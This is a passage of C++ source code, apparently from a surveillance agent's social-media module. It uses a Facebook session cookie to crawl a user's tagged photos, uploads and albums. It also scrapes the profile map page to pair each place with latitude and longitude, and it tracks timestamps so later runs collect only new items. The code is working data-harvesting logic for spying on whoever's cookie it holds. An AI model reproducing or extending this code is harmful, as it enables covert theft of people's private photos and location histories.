	Params:			valid Facebook cookie, Facebook user id, page containing PhotoAlbumsAppCollectionPagelet and SinglePhotoAlbumAppCollectionPagelet tokens, pointer to hash head
	Usage:			new fbids are allocated and inserted into hash_head, strPageContainingToken temporarily changed

*/
VOID FacebookPhotoCrawlAlbums(__in LPSTR strCookie, __in LPSTR strUserId, __in LPSTR strPageContainingToken, facebook_photo_id **hash_head)
{
	/* allocations:
		- while looping through the albums, an http request is done for each album. The buffer containing such pages
		  is allocated and free'd each time.
	*/

	/*  
		a] "controller": "PhotoAlbumsAppCollectionPagelet" contains the token needed to fetch the albums
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos&collection_token=100006576075695%3A2305272732%3A6

		b] "controller": "SinglePhotoAlbumAppCollectionPagelet" contains the token needed to later fetch the photo within the albums 
	*/

	LPSTR strParser1, strParser2;
	CHAR chTmp;

	/* a] fetch page containing albums links "albumThumbLink" */
	strParser1 = strstr(strPageContainingToken, "\"PhotoAlbumsAppCollectionPagelet\"");
	if (!strParser1)
	{
		return;
	}
	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
	{
		return;
	}

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change strPageContainingToken */
	chTmp = *strParser2;
	*strParser2 = NULL;
	
	LPWSTR strUrlAlbums = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlAlbums)
		return;

	_snwprintf_s(strUrlAlbums, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore strPageContainingToken */
	*strParser2 = chTmp;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - albums url: %s\n", __FUNCTION__, strUrlAlbums);
#endif

	DWORD dwBuffSize = 0;
	LPSTR strRecvAlbumsBuffer = NULL;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlAlbums, 443, NULL, 0, (LPBYTE *)&strRecvAlbumsBuffer, &dwBuffSize, strCookie);
	
	/* reusing later in album fetch loop b] */
	SecureZeroMemory(strUrlAlbums, URL_SIZE_IN_CHARS * sizeof(WCHAR) );

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
		return;
	

	/* b] find token "SinglePhotoAlbumAppCollectionPagelet", which is needed in stage c] */
	strParser1 = strstr(strPageContainingToken, "\"SinglePhotoAlbumAppCollectionPagelet\"");
	if (!strParser1)
	{
		return;
	}
	strParser1 = strstr(strParser1, FBID_TOKEN);

	if (!strParser1)
	{
		return;
	}

	strParser1 += strlen(FBID_TOKEN);

	strParser2 = strstr(strParser1, "\",");
	if (!strParser2)
		return;
	
	/* temporary change strPageContainingToken */
	chTmp = *strParser2;
	*strParser2 = NULL;

	LPWSTR strUrlSinglePhoto = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS * sizeof(WCHAR));
	if (!strUrlSinglePhoto)
	{
		zfree_s(strUrlAlbums);
		zfree_s(strRecvAlbumsBuffer);
		return;
	}

	_snwprintf_s(strUrlSinglePhoto, URL_SIZE_IN_CHARS, _TRUNCATE, L"/profile.php?id=%S&sk=photos&collection_token=%S", strUserId, strParser1);

	/* restore strPageContainingToken */
	*strParser2 = chTmp;

	/* c] loop through each album and fetch all the fbids */

	/*	album urls example: <a class="albumThumbLink uiMediaThumb uiScrollableThumb" href="https://www.facebook.com/media/set/?set=a.1588543974708123.1073741826.100006576075695&amp;type=3" 
		we need only set=*, the remaining is obtained from SinglePhotoAlbumAppCollectionPagelet 	*/
	
	// TODO: limit the number of albums fetched ?

	strParser1 = strRecvAlbumsBuffer;
	while (TRUE)
	{
		strParser1 = strstr(strParser1, "albumThumbLink");
		if (!strParser1)
			break;

		strParser1 = strstr(strParser1, "set/?");
		if (!strParser1)
			break;

		strParser1 += strlen("set/?");

		/* we need to replace &amp;type=3, with &type=3, atm without calling external functions*/

		strParser2 = strstr(strParser1, "&amp;type=");
		if (!strParser2)
			break;
		
		/* albums url contain "type=3" */
		if (strstr(strParser1, "type=3"))
		{

			/* after we've searched type=3 we can null terminate the string */
			*strParser2 = NULL;


			/* b] for each album fetch contained fbids */
			
			
			_snwprintf_s(strUrlAlbums, URL_SIZE_IN_CHARS, _TRUNCATE, L"%s&%S&type=3", strUrlSinglePhoto, strParser1);

			
#ifdef _DEBUG
			OutputDebug(L"[*] %S - album url: %s\n", __FUNCTION__, strUrlAlbums);
#endif

			dwBuffSize = 0;
			LPSTR strRecvThisAlbumBuffer = NULL;
			dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrlAlbums, 443, NULL, 0, (LPBYTE *) &strRecvThisAlbumBuffer, &dwBuffSize, strCookie);
			
			SecureZeroMemory(strUrlAlbums, URL_SIZE_IN_CHARS * sizeof(WCHAR));
			
			/* if there are issues, bail altogether, we'll retry on next run of the PhotoHandler */
			if (dwRet != SOCIAL_REQUEST_SUCCESS)
				break;

			FacebookPhotoExtractFbidsFromPage(strRecvThisAlbumBuffer, hash_head, PHOTOS_YOURS);
			
			zfree_s(strRecvThisAlbumBuffer);
		}

		/* prepare for next round */
		strParser1 = strParser2 + 1;
	}
	
	/* cleanup */
	zfree_s(strUrlAlbums);
	zfree_s(strRecvAlbumsBuffer);
	zfree_s(strUrlSinglePhoto);
}

/*
	Description:	given a json object containing Facebook places, extracts and packs data into additionalheader and body
	Parameters:		json object, pointer to additionalheader, body that will contain the payload, pointer to size of body, Facebook user id
	Usage:			return true there're data to log, false otherwise. Body is allocated and must be freed by the caller
*/
BOOL FacebookPlacesExtractPositions(__in JSONValue *jValue,  __in LPSTR strUserId, facebook_placeId_to_location **hash_head )
{
	/* pretty much a ripoff of FacebookPlacesExtractPosition(__in JSONValue *jValue, __out location_additionalheader_struct *additionalheader, __out BYTE **body, __out DWORD *blen, __in LPSTR strUserId ):position.cpp */
	
	/* get last place timestamp */
	DWORD dwHighestBatchTimestamp = 0;
	CHAR strUsernameForPlaces[512];
	_snprintf_s(strUsernameForPlaces, sizeof(strUsernameForPlaces), _TRUNCATE, "%s-facebookphotopositions", strUserId);
	DWORD dwLastTimestampLow, dwLastTimestampHigh;
	dwLastTimestampLow = SocialGetLastTimestamp(strUsernameForPlaces, &dwLastTimestampHigh);
	if (dwLastTimestampLow == SOCIAL_INVALID_MESSAGE_ID)
		return FALSE;

	/* get the number of locations */
	JSONObject jRoot = jValue->AsObject();
	if (jRoot.find(L"jsmods") != jRoot.end() && jRoot[L"jsmods"]->IsObject())
	{
		JSONObject jJsmods = jRoot[L"jsmods"]->AsObject();

		if (jJsmods.find(L"require") != jJsmods.end() && jJsmods[L"require"]->IsArray())
		{
			JSONArray jRequire = jJsmods[L"require"]->AsArray();

			if ( jRequire.size() > 0 && jRequire.at(0)->IsArray())
			{
				JSONArray jTmp = jRequire.at(0)->AsArray();
				if (jTmp.size() > 3 && jTmp.at(3)->IsArray())
				{
					JSONArray jTmp2 = jTmp.at(3)->AsArray();

					if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
					{
						JSONObject jObj = jTmp2.at(1)->AsObject();
						

						/* jObj contains:
						"stories":[ array with timestamps ],
						"places":[ array with places ],
						"count":4, // number of different places
						"_instanceid":"u_0_44"
						*/

						if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray()) && (jObj[L"stories"]->IsArray() && jObj[L"stories"]->IsArray()))
						{
							JSONArray jPlaces = jObj[L"places"]->AsArray();
							JSONArray jStories = jObj[L"stories"]->AsArray();

							/*  stories element example: {"timestamp":1418910342, .. ,"placeID":133355006713850, ..  }
								places element example:  {"id":133355006713850, "name":"Isle of Skye, Scotland, UK","latitude":57.41219383264, "longitude":-6.1920373066084,"city":814578, "country":"GB"   } 
							*/

							/* loop through stories, for each story find the corresponding place and set the gps record (suboptimal..) */
							for (DWORD i=0; i<jStories.size(); i++)
							{
								if (!jStories.at(i)->IsObject())
									continue;

								UINT64 current_id;
								time_t time = 0;

								/* extract story id and timestamp */
								JSONObject jStory = jStories.at(i)->AsObject();
								if (jStory.find(L"placeID") != jStory.end() && jStory[L"placeID"]->IsNumber())
								{
									current_id = (UINT64) jStory[L"placeID"]->AsNumber();
								}
								
								if (jStory.find(L"timestamp") != jStory.end() && jStory[L"timestamp"]->IsNumber())
								{
									 time = (time_t) jStory[L"timestamp"]->AsNumber();
								}

								
								/* save the most recent timestamp for this batch */
								if (time > dwHighestBatchTimestamp)
									dwHighestBatchTimestamp = time;
								
								/* if it's recent save it otherwise skip this record */
								if (time <= dwLastTimestampLow)
									continue;

								/* find place id in places: suboptimal version loop through each time */
								for (DWORD j=0; j<jPlaces.size(); j++)
								{
									if (!jPlaces.at(j)->IsObject())
										continue;

									UINT64 tmp_id;

									JSONObject jPlace = jPlaces.at(j)->AsObject();
									if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
									{
										tmp_id = (UINT64) jPlace[L"id"]->AsNumber();

										if (tmp_id == current_id)
										{
											/* got our guy, fill a gps position record */

											if (jPlace.find(L"latitude") != jPlace.end() && jPlace[L"latitude"]->IsNumber() &&
												jPlace.find(L"longitude") != jPlace.end() && jPlace[L"longitude"]->IsNumber())
											{
#ifdef _DEBUG
												OutputDebug(L"[*] Got %I64u lat long\n", tmp_id, jPlace[L"latitude"]->AsNumber(), jPlace[L"longitude"]->AsNumber());
#endif
												facebook_placeId_to_location *placeId_new = (facebook_placeId_to_location*) zalloc_s(sizeof(facebook_placeId_to_location));
												placeId_new->placeId = tmp_id;
												placeId_new->latitude =  (FLOAT) jPlace[L"latitude"]->AsNumber();
												placeId_new->longitude = (FLOAT) jPlace[L"longitude"]->AsNumber();

												facebook_placeId_to_location *placeId_tmp = NULL;
												HASH_FIND(hh, *hash_head, &placeId_new->placeId, sizeof(UINT64), placeId_tmp);
												
												if (placeId_tmp == NULL) 
													HASH_ADD(hh, *hash_head, placeId, sizeof(UINT64), placeId_new);
												else
													zfree_s(placeId_new);
											}			

											break;
										} //if (tmp_id == current_id)
									} //if (jPlace.find(L"id") != jPlace.end() && jPlace[L"id"]->IsNumber())
								} //for (DWORD j=0; j<jPlaces.size(); j++)
							} //for (DWORD i=0; i<jStories.size(); i++)


							/* save the highest timestamp in the batch */
							if (dwHighestBatchTimestamp > dwLastTimestampLow)
								SocialSetLastTimestamp(strUsernameForPlaces, dwHighestBatchTimestamp, 0);

						} //if ((jObj[L"places"]->IsArray() && jObj[L"places"]->IsArray())
					} //if (jTmp2.size() > 1 && jTmp2.at(1)->IsObject())
				}
			}
		}
	}

	/* 	true if *body is not null, otherwise false */
	return TRUE;
}

VOID FacebookPhotoFetchPlaceIdToCoordinate(__in LPSTR strCookie, __in LPSTR strUserId, facebook_placeId_to_location **idToLocation)
{
	/* pretty much a ripoff of FacebookPositionHandler(LPSTR strCookie):position.cpp */
	LPSTR strParser1, strParser2;
	

	LPWSTR strUrl = (LPWSTR) zalloc(2048*sizeof(WCHAR));
	_snwprintf_s(strUrl, 2048, _TRUNCATE, L"/profile.php?id=%S&sk=map", strUserId);
	
	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie); 

	zfree_s(strUrl);

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree(strRecvBuffer);
		return;
	}

	/* find the snippet of json we're interested in and give it to the parser */
	strParser1 = strstr(strRecvBuffer, "{\"display_dependency\":[\"pagelet_timeline_medley_inner_map\"]");
	if (!strParser1)
	{
		/* cleanup */
		zfree_s(strRecvBuffer);
		return;
	}

	strParser2 = strstr(strParser1, "})");
	*(strParser2+1) = NULL;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - position json: %S\n", __FUNCTION__, strParser1);
#endif

	LPSTR strJson = strParser1;

	JSONValue *jValue = JSON::Parse(strJson);
	if (jValue != NULL && jValue->IsObject())
	{
		FacebookPlacesExtractPositions(jValue, strUserId, idToLocation);
	}

	/* cleanup */
	zfree_s(strRecvBuffer);

	if (jValue)
		delete jValue;

	return;
}


/*
	Description:	Facebook photo handling entry point, extracts Facebook photos and its metadata
	Params:			cookie needed to log into Facebook
	Usage:			-

*/
DWORD FacebookPhotoHandler(__in LPSTR strCookie)
{
	/*	allocations:
			- items of hash_head are allocated by the crawling functions and freed in the handle loop
			- strSocialUsername_* allocated and free'd before the handle loop
	*/



	/* hash declaration */
	facebook_photo_id *hash_head = NULL;
	
	LPSTR strUserId, strScreenName;


	if (!ConfIsModuleEnabled(L"photo"))
		return SOCIAL_REQUEST_SUCCESS;


	if (!FacebookGetUserInfo(strCookie, &strUserId, &strScreenName))
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	
	/*  0] fetch Photo page, e.g.:
		https://www.facebook.com/profile.php?id=100006576075695&sk=photos

		- get collection_tokens, the tidbit in the URL that differentiate between Photos of You, Your Photo and Albums 
	    - from each page collect the fbid, which identifies a photo univocally
	*/

	LPWSTR strUrl = (LPWSTR) zalloc_s(URL_SIZE_IN_CHARS *sizeof(WCHAR));
	if (!strUrl)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	_snwprintf_s(strUrl, URL_SIZE_IN_CHARS , _TRUNCATE, L"/profile.php?id=%S&sk=photos", strUserId);

	LPSTR strRecvBuffer = NULL;
	DWORD dwBuffSize;
	DWORD dwRet = HttpSocialRequest(L"www.facebook.com", L"GET", strUrl, 443, NULL, 0, (LPBYTE *)&strRecvBuffer, &dwBuffSize, strCookie);
	
	zfree_s(strUrl); 
	

	if (dwRet != SOCIAL_REQUEST_SUCCESS)
	{
		zfree_s(strScreenName);
		zfree_s(strUserId);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}

	/* 1] Photos of You */
	FacebookPhotoCrawlPhotosOfYou(strCookie, strUserId, strRecvBuffer, &hash_head);

	/* 2] Your Photos */
	FacebookPhotoCrawlYourPhotos(strCookie, strUserId, strRecvBuffer, &hash_head);

	/* 3] Albums */
	// photos from album managed by two users are found only in Albums
	FacebookPhotoCrawlAlbums(strCookie, strUserId, strRecvBuffer, &hash_head);
	

	/* 4] if there are some photos fetch pre-emptively the map pages containing 
		  the mapping place_id -> coordinates */
	facebook_placeId_to_location *idToLocation_hash_head = NULL;

	if (HASH_COUNT(hash_head) > 0 )
		FacebookPhotoFetchPlaceIdToCoordinate(strCookie, strUserId, &idToLocation_hash_head);
		
	/* 5] Once we've collected all the fbids, 'handle' the photos */
	facebook_photo_id *fbid_tmp, *fbid_current;


	// 0 -> PHOTOS_YOURS
	// 1 -> PHOTOS_OF_YOU
	DWORD dwMaxItemsPerRun_0 = 30, dwMaxItemsPerRun_1 = 30;
	DWORD dwCurrentItemsPerRun_0 = 0, dwCurrentItemsPerRun_1 = 0;
	UINT64 highestBatchFbid_0 = 0, highestBatchFbid_1 = 0;

	size_t strUsernameSize = strlen(strUserId) + strlen("_photos_1") + 1;
	LPSTR strSocialUsername_0 = (LPSTR) zalloc_s(strUsernameSize);
	LPSTR strSocialUsername_1 = (LPSTR) zalloc_s(strUsernameSize);

	if (strSocialUsername_0 && strSocialUsername_1)
	{
		_snprintf_s(strSocialUsername_0, strUsernameSize, _TRUNCATE, "%s_photos_0", strUserId);
		_snprintf_s(strSocialUsername_1, strUsernameSize, _TRUNCATE, "%s_photos_1", strUserId);

		// get saved highest timestamp  for both the sets
		UINT64 savedHighestBatchFbid_0 = SocialGetLastMessageId(strSocialUsername_0);
		UINT64 savedHighestBatchFbid_1 = SocialGetLastMessageId(strSocialUsername_1);
		

		// loop through the 2 sets and select the candidates for each set, i.e. filter
		HASH_ITER(hh, hash_head, fbid_current, fbid_tmp) {

#ifdef _DEBUG		
			OutputDebug(L"[*] %S - found: %I64d\n", __FUNCTION__, fbid_current->fbid);
#endif
			// set PHOTOS_YOURS
			if (fbid_current->dwType == PHOTOS_YOURS)
			{
				if (fbid_current->fbid > savedHighestBatchFbid_0 && 
					dwCurrentItemsPerRun_0 < dwMaxItemsPerRun_0 )
				{
					// handle the photo
					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current, idToLocation_hash_head);
					dwCurrentItemsPerRun_0 +=1;

					// update highest batch fbid in case
					if (fbid_current->fbid > highestBatchFbid_0)
						highestBatchFbid_0 = fbid_current->fbid;

				}
			}
			// set PHOTOS_OF_YOU
			else if (fbid_current->dwType == PHOTOS_OF_YOU)
			{
				if (fbid_current->fbid > savedHighestBatchFbid_1 && 
					dwCurrentItemsPerRun_1 < dwMaxItemsPerRun_1 )
				{
					// handle the photo
					FacebookPhotoHandleSinglePhoto(strCookie, fbid_current,  idToLocation_hash_head);
					dwCurrentItemsPerRun_1 +=1;

					// update highest batch fbid in case
					if (fbid_current->fbid > highestBatchFbid_1)
						highestBatchFbid_1 = fbid_current->fbid;
				}
			}

		
			// remove the photo from the hash
			HASH_DEL(hash_head, fbid_current);
			zfree_s(fbid_current);
		}

		// update highest fbid if needed
		if (highestBatchFbid_0 > savedHighestBatchFbid_0)
			SocialSetLastMessageId(strSocialUsername_0, highestBatchFbid_0 );

		if (highestBatchFbid_1 > savedHighestBatchFbid_1)
			SocialSetLastMessageId(strSocialUsername_1, highestBatchFbid_1 );
	

		// free facebook_placeId_to_location *idToLocation
		facebook_placeId_to_location *placeId_tmp, *placeId_current;
		HASH_ITER(hh, idToLocation_hash_head, placeId_current, placeId_tmp)
		{
			HASH_DEL(idToLocation_hash_head, placeId_current);
			zfree_s(placeId_current);
		}


		zfree_s(strSocialUsername_0);
		zfree_s(strSocialUsername_1);
	}
	

	/* cleanup */
	zfree_s(strScreenName);
	zfree_s(strUserId);
	zfree_s(strRecvBuffer);
	
	return SOCIAL_REQUEST_SUCCESS;
}

